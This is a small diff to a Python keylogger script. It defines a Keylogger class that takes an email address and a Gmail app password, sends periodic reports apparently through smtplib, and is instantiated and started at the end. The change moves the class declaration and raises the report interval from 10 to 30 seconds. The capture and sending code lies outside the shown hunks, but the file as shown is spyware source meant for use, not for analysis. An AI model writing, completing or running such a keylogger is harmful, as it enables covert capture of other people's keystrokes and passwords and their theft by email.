@@ -4,8 +4,8 @@ import smtplib
 import logging
 
 log = ""
-class Keylogger :
 
+class Keylogger :
     def __init__(self , set_interval , mail, passwd) :
         self.log =""
         self.set_interval = set_interval
@@ -47,6 +47,6 @@ class Keylogger :
             self.report()
             keyboard.join()
 
-my_keylogger = Keylogger(10,"your email address","app password for gmail account")
+my_keylogger = Keylogger(30,"your email address","app password for gmail account")
 my_keylogger.start()
 
